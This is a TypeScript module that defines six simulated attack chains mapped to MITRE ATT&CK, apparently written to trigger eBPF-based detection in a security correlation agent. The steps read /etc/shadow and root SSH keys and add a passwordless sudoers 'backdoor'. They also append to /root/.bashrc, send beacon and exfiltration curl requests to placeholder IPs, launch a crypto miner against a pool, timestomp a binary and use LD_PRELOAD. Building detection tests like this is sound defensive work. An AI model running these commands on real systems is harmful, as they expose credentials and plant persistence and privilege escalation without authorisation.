/**
 * scenarios.ts — Six attack simulation scenarios.
 *
 * Each function performs REAL Linux system operations (file reads, process
 * spawning, network connections) that Jibril's eBPF sensors detect.
 * The operations are intentionally benign but suspicious-looking, designed
 * to trigger specific MITRE ATT&CK tactic/kind combinations that the
 * Jibril Correlation Agent's chain patterns match on.
 *
 * Chain pattern mapping (from jibril-correlation-agent src/correlation.ts):
 *
 *   1. credential-theft-privesc-persistence
 *      credential_access → privilege_escalation → persistence
 *
 *   2. execution-c2-exfiltration
 *      execution → command_and_control → exfiltration
 *
 *   3. container-breakout
 *      defense_evasion(exec_from_unusual_dir) → credential_access → privilege_escalation(sudoers_modification)
 *
 *   4. cryptojacking
 *      impact(crypto_miner_execution) → command_and_control
 *
 *   5. supply-chain-lateral
 *      execution → defense_evasion → credential_access
 *
 *   6. linker-hijack-persistence
 *      persistence(dynamic_linker_attacks) → defense_evasion → execution
 */

import { execSync, spawnSync } from "node:child_process";
import { writeFileSync, readFileSync, copyFileSync, existsSync, mkdirSync, appendFileSync, chmodSync } from "node:fs";

export interface ScenarioResult {
  scenario: string;
  description: string;
  chainPattern: string;
  steps: string[];
  success: boolean;
}

function exec(cmd: string, label: string): string {
  try {
    const output = execSync(cmd, {
      encoding: "utf-8",
      timeout: 5000,
      stdio: ["pipe", "pipe", "pipe"],
    });
    console.log(`  [OK] ${label}`);
    return output.trim();
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    console.log(`  [FAIL] ${label}: ${msg.split("\n")[0]}`);
    return "";
  }
}

// ─── Scenario 1: Credential Theft → Privilege Escalation → Persistence ───────

export function credentialTheft(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:credential-theft] Starting...");

  // Step 1: credential_access — read /etc/shadow
  console.log("  Step 1: Reading /etc/shadow (credential_access)");
  exec("cat /etc/shadow", "cat /etc/shadow");
  steps.push("Read /etc/shadow (credential_access)");

  // Step 2: privilege_escalation — attempt sudo
  console.log("  Step 2: Attempting sudo -l (privilege_escalation)");
  exec("sudo -l", "sudo -l");
  steps.push("Attempted sudo -l (privilege_escalation)");

  // Step 3: persistence — write to .bashrc
  console.log("  Step 3: Appending to /root/.bashrc (persistence)");
  try {
    appendFileSync("/root/.bashrc", "\n# demo: persistence backdoor\nexport DEMO_BACKDOOR=1\n");
    console.log("  [OK] Appended to /root/.bashrc");
  } catch {
    console.log("  [FAIL] Could not write /root/.bashrc");
  }
  steps.push("Appended persistence payload to /root/.bashrc (persistence)");

  console.log("[scenario:credential-theft] Done.\n");
  return {
    scenario: "credential-theft",
    description: "Credential Theft → Privilege Escalation → Persistence",
    chainPattern: "credential-theft-privesc-persistence",
    steps,
    success: true,
  };
}

// ─── Scenario 2: Execution → C2 → Exfiltration ──────────────────────────────

export function executionC2Exfil(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:execution-c2-exfil] Starting...");

  // Step 1: execution — run dropped payload from /tmp
  console.log("  Step 1: Executing /tmp/payload (execution)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/tmp/payload");
    chmodSync("/tmp/payload", 0o755);
  } catch { /* ignore copy errors */ }
  exec("/tmp/payload --exfil --target s3://data-bucket", "Execute /tmp/payload");
  steps.push("Executed /tmp/payload (execution)");

  // Step 2: command_and_control — connect to threat domain (non-routable)
  console.log("  Step 2: Contacting C2 server (command_and_control)");
  exec("curl -sf --connect-timeout 2 http://192.0.2.1:8443/beacon || true", "C2 beacon to 192.0.2.1");
  steps.push("Connected to C2 at 192.0.2.1:8443 (command_and_control)");

  // Step 3: exfiltration — send data out
  console.log("  Step 3: Exfiltrating data (exfiltration)");
  exec('curl -sf --connect-timeout 2 -X POST -d "stolen=data" http://192.0.2.2:9090/upload || true', "Exfil to 192.0.2.2");
  steps.push("Exfiltrated data to 192.0.2.2:9090 (exfiltration)");

  console.log("[scenario:execution-c2-exfil] Done.\n");
  return {
    scenario: "execution-c2-exfil",
    description: "Execution → C2 → Exfiltration",
    chainPattern: "execution-c2-exfiltration",
    steps,
    success: true,
  };
}

// ─── Scenario 3: Container Breakout ──────────────────────────────────────────

export function containerBreakout(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:container-breakout] Starting...");

  // Step 1: defense_evasion / exec_from_unusual_dir — execute from /dev/shm
  console.log("  Step 1: Executing from /dev/shm (defense_evasion / exec_from_unusual_dir)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/dev/shm/exploit");
    chmodSync("/dev/shm/exploit", 0o755);
  } catch { /* ignore */ }
  exec("/dev/shm/exploit --escalate", "Execute /dev/shm/exploit");
  steps.push("Executed binary from /dev/shm (defense_evasion / exec_from_unusual_dir)");

  // Step 2: credential_access — read /etc/shadow
  console.log("  Step 2: Reading /etc/shadow (credential_access)");
  exec("cat /etc/shadow", "cat /etc/shadow");
  steps.push("Read /etc/shadow (credential_access)");

  // Step 3: privilege_escalation / sudoers_modification — write sudoers
  console.log("  Step 3: Writing /etc/sudoers.d/backdoor (privilege_escalation / sudoers_modification)");
  try {
    writeFileSync("/etc/sudoers.d/backdoor", "node ALL=(ALL) NOPASSWD:ALL\n");
    console.log("  [OK] Wrote /etc/sudoers.d/backdoor");
  } catch {
    console.log("  [FAIL] Could not write /etc/sudoers.d/backdoor");
  }
  steps.push("Wrote /etc/sudoers.d/backdoor (privilege_escalation / sudoers_modification)");

  console.log("[scenario:container-breakout] Done.\n");
  return {
    scenario: "container-breakout",
    description: "Container Breakout: exec from unusual dir → credential theft → sudoers modification",
    chainPattern: "container-breakout",
    steps,
    success: true,
  };
}

// ─── Scenario 4: Cryptojacking ───────────────────────────────────────────────

export function cryptojacking(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:cryptojacking] Starting...");

  // Step 1: impact / crypto_miner_execution — run binary named "xmrig"
  console.log("  Step 1: Executing xmrig (impact / crypto_miner_execution)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/tmp/xmrig");
    chmodSync("/tmp/xmrig", 0o755);
  } catch { /* ignore */ }
  exec("/tmp/xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444 -u wallet123", "Execute xmrig");
  steps.push("Executed /tmp/xmrig crypto miner (impact / crypto_miner_execution)");

  // Step 2: command_and_control — connect to mining pool
  console.log("  Step 2: Connecting to mining pool (command_and_control)");
  exec("curl -sf --connect-timeout 2 http://192.0.2.1:4444/ || true", "Connect to mining pool");
  steps.push("Connected to mining pool at 192.0.2.1:4444 (command_and_control)");

  console.log("[scenario:cryptojacking] Done.\n");
  return {
    scenario: "cryptojacking",
    description: "Cryptojacking: crypto miner execution → C2 mining pool connection",
    chainPattern: "cryptojacking",
    steps,
    success: true,
  };
}

// ─── Scenario 5: Supply Chain + Lateral Movement ─────────────────────────────

export function supplyChainLateral(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:supply-chain] Starting...");

  // Step 1: execution — run dropped binary
  console.log("  Step 1: Executing dropped binary (execution)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/tmp/npm-postinstall");
    chmodSync("/tmp/npm-postinstall", 0o755);
  } catch { /* ignore */ }
  exec("/tmp/npm-postinstall --install-hook", "Execute dropped binary");
  steps.push("Executed /tmp/npm-postinstall supply chain payload (execution)");

  // Step 2: defense_evasion — timestomp / rename binary to hide
  console.log("  Step 2: Timestomping + renaming binary (defense_evasion)");
  exec("touch -r /bin/sh /tmp/npm-postinstall", "Timestomp binary");
  try {
    copyFileSync("/tmp/npm-postinstall", "/tmp/node");
    chmodSync("/tmp/node", 0o755);
  } catch { /* ignore */ }
  exec("/tmp/node --version || true", "Execute renamed binary");
  steps.push("Timestomped and renamed binary to /tmp/node (defense_evasion)");

  // Step 3: credential_access — steal SSH keys
  console.log("  Step 3: Reading SSH keys (credential_access)");
  exec("cat /root/.ssh/id_rsa", "Read SSH private key");
  steps.push("Read /root/.ssh/id_rsa (credential_access)");

  console.log("[scenario:supply-chain] Done.\n");
  return {
    scenario: "supply-chain",
    description: "Supply Chain + Lateral Movement: execution → defense evasion → credential theft",
    chainPattern: "supply-chain-lateral",
    steps,
    success: true,
  };
}

// ─── Scenario 6: Dynamic Linker Hijack + Persistence ─────────────────────────

export function linkerHijack(): ScenarioResult {
  const steps: string[] = [];
  console.log("\n[scenario:linker-hijack] Starting...");

  // Step 1: persistence / dynamic_linker_attacks — set LD_PRELOAD
  console.log("  Step 1: Creating fake .so and spawning with LD_PRELOAD (persistence / dynamic_linker_attacks)");
  try {
    writeFileSync("/tmp/libhook.so", "FAKE_SHARED_LIBRARY");
  } catch { /* ignore */ }
  const result = spawnSync("/usr/local/bin/demo-payload", ["--hooked"], {
    env: { ...process.env, LD_PRELOAD: "/tmp/libhook.so" },
    encoding: "utf-8",
    timeout: 5000,
  });
  console.log(result.status === 0 ? "  [OK] Spawned with LD_PRELOAD" : "  [FAIL] LD_PRELOAD spawn");
  steps.push("Spawned process with LD_PRELOAD=/tmp/libhook.so (persistence / dynamic_linker_attacks)");

  // Step 2: defense_evasion — rename /tmp binary to hide
  console.log("  Step 2: Masquerading binary (defense_evasion)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/tmp/systemd-helper");
    chmodSync("/tmp/systemd-helper", 0o755);
  } catch { /* ignore */ }
  exec("/tmp/systemd-helper --stealth", "Execute masqueraded binary");
  steps.push("Executed masqueraded /tmp/systemd-helper (defense_evasion)");

  // Step 3: execution — exec from /tmp
  console.log("  Step 3: Executing from /tmp (execution)");
  try {
    copyFileSync("/usr/local/bin/demo-payload", "/tmp/backdoor");
    chmodSync("/tmp/backdoor", 0o755);
  } catch { /* ignore */ }
  exec("/tmp/backdoor --persistent", "Execute /tmp/backdoor");
  steps.push("Executed /tmp/backdoor (execution)");

  console.log("[scenario:linker-hijack] Done.\n");
  return {
    scenario: "linker-hijack",
    description: "Dynamic Linker Hijack + Persistence: LD_PRELOAD → defense evasion → execution",
    chainPattern: "linker-hijack-persistence",
    steps,
    success: true,
  };
}

// ─── Scenario registry ───────────────────────────────────────────────────────

export const SCENARIOS: Record<string, () => ScenarioResult> = {
  "credential-theft": credentialTheft,
  "execution-c2-exfil": executionC2Exfil,
  "container-breakout": containerBreakout,
  "cryptojacking": cryptojacking,
  "supply-chain": supplyChainLateral,
  "linker-hijack": linkerHijack,
};

export const SCENARIO_NAMES = Object.keys(SCENARIOS);
